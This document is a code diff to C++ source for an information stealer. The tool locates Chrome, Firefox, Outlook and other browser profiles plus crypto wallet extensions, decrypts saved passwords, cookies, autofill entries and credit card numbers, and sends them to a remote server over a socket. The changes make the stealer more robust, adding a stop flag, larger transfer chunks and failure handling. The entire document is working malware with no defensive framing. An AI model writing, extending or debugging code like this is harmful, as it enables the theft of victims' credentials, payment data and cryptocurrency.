@@ -42,6 +42,8 @@ struct PacketHeader {
 static const uint16_t PACKET_SIGNATURE = 0x524E;
 static const uint8_t PACKET_TYPE_RECOVERY_FILE = 0x07;
 
+static bool g_running = true;
+
 struct WalletMetadata {
     std::string name;
     std::string chromium_id;
@@ -54,12 +56,12 @@ static std::vector<WalletMetadata> target_wallets = {
     {"coinbasewallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase wallet"}
 };
 
-void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
-    if (sock == INVALID_SOCKET) return;
+bool send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
+    if (!g_running || sock == INVALID_SOCKET) return false;
 
     uint32_t pathLen = (uint32_t)relPath.size();
     uint32_t totalDataSize = (uint32_t)data.size();
-    const uint32_t CHUNK_SIZE = 64 * 1024;
+    const uint32_t CHUNK_SIZE = 256 * 1024; // Increased chunk size for performance
     uint32_t offset = 0;
 
     if (totalDataSize == 0) {
@@ -72,11 +74,13 @@ void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vec
         memcpy(ptr, relPath.c_str(), pathLen); ptr += pathLen;
         uint32_t zero = 0;
         memcpy(ptr, &zero, sizeof(uint32_t));
-        send(sock, (const char*)packet.data(), (int)packet.size(), 0);
-        return;
+        int sent = send(sock, (const char*)packet.data(), (int)packet.size(), 0);
+        if (sent <= 0) { g_running = false; return false; }
+        return true;
     }
 
     while (offset < totalDataSize) {
+        if (!g_running) return false;
         uint32_t currentChunkSize = (totalDataSize - offset > CHUNK_SIZE) ? CHUNK_SIZE : (totalDataSize - offset);
         uint32_t payloadSize = sizeof(uint32_t) + pathLen + sizeof(uint32_t) + currentChunkSize;
 
@@ -93,21 +97,21 @@ void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vec
         const char* p = (const char*)packet.data();
         while (remaining > 0) {
             int sent = send(sock, p, remaining, 0);
-            if (sent <= 0) break;
+            if (sent <= 0) { g_running = false; return false; }
             p += sent;
             remaining -= sent;
         }
 
         offset += currentChunkSize;
-        if (offset < totalDataSize) Sleep(10);
     }
+    return true;
 }
 
 void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const std::string& server_path_prefix) {
-    if (!fs::exists(source_dir)) return;
+    if (!g_running || !fs::exists(source_dir)) return;
     std::error_code ec;
     for (const auto& entry : fs::recursive_directory_iterator(source_dir, ec)) {
-        if (ec) break;
+        if (!g_running || ec) break;
         if (entry.is_regular_file()) {
             std::ifstream ifs(entry.path(), std::ios::binary);
             if (ifs) {
@@ -230,6 +234,7 @@ void extract_firefox_wallets(SOCKET sock, const fs::path& profile_path, const st
 std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera);
 
 void run_recovery(SOCKET sock) {
+    g_running = true;
     std::vector<BrowserConfig> configs = {
         {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "mail_clients/Outlook", "outlook_tmp", false, false, false, false},
         {"Google Chrome", "chrome.exe", {L"Google\\Chrome\\Application\\chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
@@ -633,6 +638,7 @@ bool extract_key(SOCKET sock, uint32_t thread_id, HANDLE h_process, const Browse
 }
 
 void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
+    if (!g_running) return;
     fs::path db_path = profile_path / "Login Data"; if (!fs::exists(db_path)) db_path = profile_path / "Ya Passman Data";
     if (!fs::exists(db_path)) return; std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
@@ -640,7 +646,9 @@ void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::str
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ostringstream oss_txt, oss_json;
             oss_json << "[\n"; bool first = true;
-            while (sqlite3_step(stmt) == SQLITE_ROW) {
+            bool any_data = false;
+            while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                any_data = true;
                 const char* url = (const char*)sqlite3_column_text(stmt, 0); const char* user = (const char*)sqlite3_column_text(stmt, 1);
                 const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 2); int blob_size = sqlite3_column_bytes(stmt, 2);
                 std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
@@ -658,14 +666,19 @@ void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::str
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/passwords.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/passwords.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            if (any_data) {
+                std::string str_txt = oss_txt.str();
+                if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/passwords.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
+                std::string str_json = oss_json.str();
+                if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/passwords.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            }
         }
         sqlite3_close(db);
     }
 }
 
 void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera, const std::string& browser_name, const std::string& profile_name) {
+    if (!g_running) return;
     fs::path db_path = profile_path / "Network" / "Cookies"; if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
     if (!fs::exists(db_path)) return; std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
@@ -673,7 +686,9 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ostringstream oss_txt, oss_json;
             oss_json << "[\n"; bool first = true;
-            while (sqlite3_step(stmt) == SQLITE_ROW) {
+            bool any_data = false;
+            while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                any_data = true;
                 const char* host = (const char*)sqlite3_column_text(stmt, 0); const char* name = (const char*)sqlite3_column_text(stmt, 1);
                 const char* value = (const char*)sqlite3_column_text(stmt, 2); const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
                 int blob_size = sqlite3_column_bytes(stmt, 3);
@@ -724,24 +739,32 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/cookies.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/cookies.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            if (any_data) {
+                std::string str_txt = oss_txt.str();
+                if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/cookies.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
+                std::string str_json = oss_json.str();
+                if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/cookies.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            }
         }
         sqlite3_close(db);
     }
 }
 
 void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
+    if (!g_running) return;
     std::vector<std::string> db_names = {"Web Data", "Ya Autofill Data", "Ya Credit Cards"};
     std::ostringstream oss_txt, oss_json;
     oss_json << "[\n"; bool first = true;
+    bool any_data = false;
     for (const auto& db_name : db_names) {
+        if (!g_running) break;
         fs::path db_path = profile_path / db_name; if (!fs::exists(db_path)) continue;
         std::string uri = path_to_uri(db_path); sqlite3* db;
         if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
             sqlite3_stmt* stmt;
             if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
-                while (sqlite3_step(stmt) == SQLITE_ROW) {
+                while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                    any_data = true;
                     const char* name = (const char*)sqlite3_column_text(stmt, 0); const char* value = (const char*)sqlite3_column_text(stmt, 1);
                     std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                     oss_txt << "Form: " << str_name << " = " << str_val << "\n";
@@ -760,7 +783,8 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
                 std::string col = strstr(table, "name") ? "first_name" : (strstr(table, "email") ? "email" : "number");
                 std::string sql = "SELECT guid, " + col + " FROM " + table;
                 if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
-                    while (sqlite3_step(stmt) == SQLITE_ROW) {
+                while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                    any_data = true;
                         const char* guid = (const char*)sqlite3_column_text(stmt, 0); const char* val = (const char*)sqlite3_column_text(stmt, 1);
                         std::string str_guid = guid ? guid : ""; std::string str_val = val ? val : "";
                         oss_txt << table << " (" << str_guid << "): " << str_val << "\n";
@@ -776,7 +800,8 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
                 }
             }
             if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
-                while (sqlite3_step(stmt) == SQLITE_ROW) {
+                while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                    any_data = true;
                     const char* name = (const char*)sqlite3_column_text(stmt, 0); int m = sqlite3_column_int(stmt, 1); int y = sqlite3_column_int(stmt, 2);
                     const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3); int blob_size = sqlite3_column_bytes(stmt, 3);
                     std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
@@ -799,11 +824,16 @@ void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::stri
         }
     }
     oss_json << "\n]";
-    std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/autofill.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-    std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/autofill.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+    if (any_data) {
+        std::string str_txt = oss_txt.str();
+        if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/autofill.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
+        std::string str_json = oss_json.str();
+        if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/autofill.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+    }
 }
 
 void extract_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
+    if (!g_running) return;
     fs::path db_path = profile_path / "History"; if (!fs::exists(db_path)) return;
     std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
@@ -811,7 +841,9 @@ void extract_history(SOCKET sock, const fs::path& profile_path, const std::strin
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ostringstream oss_txt, oss_json;
             oss_json << "[\n"; bool first = true;
-            while (sqlite3_step(stmt) == SQLITE_ROW) {
+            bool any_data = false;
+            while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                any_data = true;
                 const char* url = (const char*)sqlite3_column_text(stmt, 0); const char* title = (const char*)sqlite3_column_text(stmt, 1); int count = sqlite3_column_int(stmt, 2);
                 long long last_visit = sqlite3_column_int64(stmt, 3);
                 std::string str_url = url ? url : ""; std::string str_title = title ? title : "";
@@ -827,8 +859,12 @@ void extract_history(SOCKET sock, const fs::path& profile_path, const std::strin
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/history.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/history.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            if (any_data) {
+                std::string str_txt = oss_txt.str();
+                if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/history.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
+                std::string str_json = oss_json.str();
+                if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/history.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            }
         }
         sqlite3_close(db);
     }
@@ -879,6 +915,7 @@ void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key,
 }
 
 void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::string& browser_name, const std::string& profile_name) {
+    if (!g_running) return;
     fs::path db_path = profile_path / "cookies.sqlite"; if (!fs::exists(db_path)) return;
     std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
@@ -886,7 +923,9 @@ void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const st
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ostringstream oss_txt, oss_json;
             oss_json << "[\n"; bool first = true;
-            while (sqlite3_step(stmt) == SQLITE_ROW) {
+            bool any_data = false;
+            while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                any_data = true;
                 const char* host = (const char*)sqlite3_column_text(stmt, 0); const char* name = (const char*)sqlite3_column_text(stmt, 1);
                 const char* value = (const char*)sqlite3_column_text(stmt, 2); const char* path = (const char*)sqlite3_column_text(stmt, 3);
                 long long expiry = sqlite3_column_int64(stmt, 4); int secure = sqlite3_column_int(stmt, 5); int httponly = sqlite3_column_int(stmt, 6);
@@ -931,14 +970,19 @@ void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const st
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/cookies.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/cookies.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            if (any_data) {
+                std::string str_txt = oss_txt.str();
+                if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/cookies.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
+                std::string str_json = oss_json.str();
+                if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/cookies.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            }
         }
         sqlite3_close(db);
     }
 }
 
 void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
+    if (!g_running) return;
     fs::path db_path = profile_path / "places.sqlite"; if (!fs::exists(db_path)) return;
     std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
@@ -946,7 +990,9 @@ void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const st
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ostringstream oss_txt, oss_json;
             oss_json << "[\n"; bool first = true;
-            while (sqlite3_step(stmt) == SQLITE_ROW) {
+            bool any_data = false;
+            while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                any_data = true;
                 const char* url = (const char*)sqlite3_column_text(stmt, 0); const char* title = (const char*)sqlite3_column_text(stmt, 1); int count = sqlite3_column_int(stmt, 2);
                 long long last_visit = sqlite3_column_int64(stmt, 3);
                 std::string str_url = url ? url : ""; std::string str_title = title ? title : "";
@@ -962,14 +1008,19 @@ void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const st
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/history.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/history.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            if (any_data) {
+                std::string str_txt = oss_txt.str();
+                if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/history.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
+                std::string str_json = oss_json.str();
+                if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/history.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            }
         }
         sqlite3_close(db);
     }
 }
 
 void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
+    if (!g_running) return;
     fs::path db_path = profile_path / "formhistory.sqlite"; if (!fs::exists(db_path)) return;
     std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
@@ -977,7 +1028,9 @@ void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const s
         if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ostringstream oss_txt, oss_json;
             oss_json << "[\n"; bool first = true;
-            while (sqlite3_step(stmt) == SQLITE_ROW) {
+            bool any_data = false;
+            while (g_running && sqlite3_step(stmt) == SQLITE_ROW) {
+                any_data = true;
                 const char* name = (const char*)sqlite3_column_text(stmt, 0); const char* value = (const char*)sqlite3_column_text(stmt, 1);
                 std::string str_name = name ? name : ""; std::string str_val = value ? value : "";
                 oss_txt << "Field: " << str_name << " = " << str_val << "\n";
@@ -990,8 +1043,12 @@ void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const s
             }
             oss_json << "\n]";
             sqlite3_finalize(stmt);
-            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/autofill.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/autofill.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            if (any_data) {
+                std::string str_txt = oss_txt.str();
+                if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/autofill.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
+                std::string str_json = oss_json.str();
+                if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/autofill.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+            }
         }
         sqlite3_close(db);
     }
@@ -1016,6 +1073,7 @@ bool load_nss(const fs::path& nss_path, NSS_Functions& f) {
 }
 
 void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const fs::path& nss_dir) {
+    if (!g_running) return;
     NSS_Functions nss; if (!load_nss(nss_dir, nss)) return;
     if (nss.NSS_Init(profile_path.string().c_str()) == SECSuccess) {
         void* slot = nss.PK11_GetInternalKeySlot();
@@ -1027,7 +1085,9 @@ void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const 
                     std::ostringstream oss_txt, oss_json;
                     oss_json << "[\n"; bool first = true;
                     size_t pos = 0;
-                    while ((pos = content.find("\"hostname\":\"", pos)) != std::string::npos) {
+                    bool any_data = false;
+                    while (g_running && (pos = content.find("\"hostname\":\"", pos)) != std::string::npos) {
+                        any_data = true;
                         pos += 12; size_t end = content.find("\"", pos); std::string host = content.substr(pos, end - pos);
                         pos = content.find("\"encryptedUsername\":\"", pos); pos += 21; end = content.find("\"", pos); std::string enc_user = content.substr(pos, end - pos);
                         pos = content.find("\"encryptedPassword\":\"", pos); pos += 21; end = content.find("\"", pos); std::string enc_pass = content.substr(pos, end - pos);
@@ -1049,8 +1109,12 @@ void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const 
                         pos = end;
                     }
                     oss_json << "\n]";
-                    std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/passwords.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
-                    std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/passwords.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+                    if (any_data) {
+                        std::string str_txt = oss_txt.str();
+                        if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/passwords.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
+                        std::string str_json = oss_json.str();
+                        if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/passwords.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
+                    }
                 }
             }
             nss.PK11_FreeSlot(slot);
